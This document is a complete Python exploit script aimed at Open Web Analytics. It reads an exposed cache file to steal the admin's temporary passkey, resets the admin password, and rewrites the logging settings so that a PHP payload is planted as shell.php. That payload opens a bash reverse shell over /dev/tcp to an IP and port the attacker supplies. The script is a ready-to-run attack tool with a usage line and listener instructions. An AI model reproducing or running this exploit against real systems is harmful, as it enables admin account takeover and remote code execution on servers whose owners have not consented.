#!/usr/bin/env python3

import requests
import hashlib
import base64
import re
import sys
from time import sleep

def creatFailedLogin(s, host):
	data = {'owa_user_id': 'admin', 'owa_password': 'something', 'owa_action': 'base.login', 'owa_submit_btn': 'Login'}
	r = s.post(host, data=data)
	result = r.text
	if "Login Failed!" in result:
		print("[*] Created failed login attempt!")
		return
	else:
		print("[X] Something went wrong!, Try again!")
		exit()

def getTempkey(s, host):
	cache_dir = "owa-data/caches/1/owa_user/"
	key = "user_id1" 
	hkey = hashlib.md5(key.encode()).hexdigest()

	while True:
		r = s.get(host + cache_dir + hkey + ".php")
		result = r.text
		if "404 Not Found" in result:
			print("[X] Failed to retrieve Cache, Admin is probably not logged in yet!")
			print("[*] Lets trigger a failed login attempt to create the cache file for the admin user.")
			sleep(1)
			creatFailedLogin(s, host)
			continue
		else:
			print("[*] Succesfully retrieved the cache!")
			cache = base64.b64decode(result[9:-6]).decode()
			tempkey = re.compile("s:32:\"(.*)$").search(re.compile("temp_passkey(.*)$").search(cache).group(1)).group(1)[:32]
			print("[*] Succefully retrieved the tempkey: ", tempkey)
			break
	return tempkey

def changeAdminpass(s, host, newPass, tempkey):
	print("[*] Changing Admin password")
	data = {'owa_password': f'{newPass}', 'owa_password2': f'{newPass}', 'owa_k': f'{tempkey}' ,'owa_action': 'base.usersChangePassword', 'owa_submit_btn': 'Save+Your+New+Password'}
	r = s.post(host, data=data)
	result = r.text
	if "errors" in result:
		print("[X] Something went wrong, Try again!")
		exit()
	else:
		print(f"[*] Changed Admin password to: {newPass}")
		return

def changeSetting(s, host, ip, port):
	settings = "index.php?owa_do=base.optionsGeneral"
	r = s.get(host + settings)
	log_path = re.findall(r'"(.*?)"', re.compile("owa_config\\[base.async_log_dir\\]\"(.*)").search(r.text).group(1))[0]
	if log_path == "":
		log_path = "/var/www/html/owa-data/logs/"
		print(f"[X] Didnt found log file, manually set to: {log_path}, if not working change the log file path.")
	nonce = re.findall(r'"(.*?)"', re.compile("owa_nonce\"(.*)").search(r.text).group(1))[0]
	print(f"[*] Found log path at: {log_path}")
	print(f"[*] Grabbed nonce: {nonce}")
	path = log_path + "shell.php"
	payload = f"<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'\");?>"
	data = {'owa_config[base.error_log_file]': f'{path}', 'owa_config[base.error_log_level]': '2', 'owa_config[base.excluded_ips]': f'{payload}', 'owa_nonce': f'{nonce}', 'owa_action': 'base.optionsUpdate', 'owa_module': 'base'}
	r = s.post(host + settings, data=data)
	if r.status_code == 200:
		print("[*] Succesfully changed settings")
		print(f"[*] Reverse shell at {host}owa-data/logs/shell.php")
	else:
		print("[X] Something went wrong, Try again!")
		exit()
	return log_path, nonce

def getRevshell(s, host, newPass, ip, port):
	print("[*] Trying to login as Admin")
	data = {'owa_user_id': 'admin', 'owa_password': f'{newPass}', 'owa_action': 'base.login', 'owa_submit_btn': 'Login'}
	r = s.post(host, data=data)
	result = r.text
	if "Login Failed!" in result:
		print("[X] Something went wrong, Try again!")
		exit()
	print("[*] Succefully logged in as Admin!")
	print("[*] Changing Settings...")
	log_path, nonce = changeSetting(s, host, ip, port)
	sleep(1)
	print("[*] Triggering reverse shell...")
	s.get(host + 'owa-data/logs/shell.php')
	print("[X] Something went wrong! Try again!")

def main():
	print('''
\033[0;36m       ________ 
\033[0;36m      /    /   \ 
\033[0;36m     /         / \033[0;33mHACKNCORP TOOLS
\033[0;37m    /         / \033[0;33mBULK 0DAY SCANNER
\033[0;37m    \___/____/ \033[0;33mhackncorp@gmail.com
		''')
	print("[*] Start exploit!")
	if len(sys.argv) < 5:
		sys.exit("[*] Usage: python3 exploit.py http://<url>/ newPass ip port")
	elif not sys.argv[1].endswith("/"):
		sys.exit("Dont forget to end the url with a slash(/)") 
	else:
		host, newPass, ip, port = sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4]

	print(f"[*] Dont forget to setup a listener on port {port}!")
	sleep(1)
	s = requests.session()
	tempkey = getTempkey(s, host)
	sleep(1)
	changeAdminpass(s, host, newPass, tempkey)
	sleep(1)
	getRevshell(s, host, newPass, ip, port)

if __name__ == "__main__":
	main()
